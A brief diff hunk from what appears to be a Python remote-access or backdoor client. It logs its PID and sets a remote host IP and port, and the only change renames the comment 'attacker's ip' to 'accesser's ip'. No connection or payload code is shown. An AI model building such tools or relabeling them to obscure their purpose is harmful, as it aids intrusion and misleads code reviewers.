@@ -17,7 +17,7 @@ usp = os.environ['USERPROFILE'].replace('\\','/')+'/'
 print('[c] Logging PID ...')
 open(curdir+'PID.txt', 'a', encoding='utf-8').write(str(os.getpid())+'\n')
 print('[c] PID Logged')
-rhost = '192.168.2.5' #attacker's ip
+rhost = '192.168.2.5' #accesser's ip
 rport = 8081
 
 def keygen(numseed):
